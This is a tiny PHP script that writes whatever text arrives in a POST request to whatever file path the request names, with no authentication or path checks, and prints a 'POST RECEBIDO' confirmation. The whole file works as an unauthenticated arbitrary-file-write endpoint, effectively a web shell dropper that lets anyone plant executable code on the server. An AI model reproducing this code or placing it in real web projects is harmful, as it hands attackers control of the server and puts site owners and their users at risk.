<?php

 	if (isset($_POST['NomeArquivo'])) {
		$name = $_POST['NomeArquivo'];
		$text = $_POST['Conteudo'];
		$file = fopen($name, 'w+');
		fwrite($file, $text);
		fclose($file);
		ECHO " <<< POST RECEBIDO >>>";
	}

?>
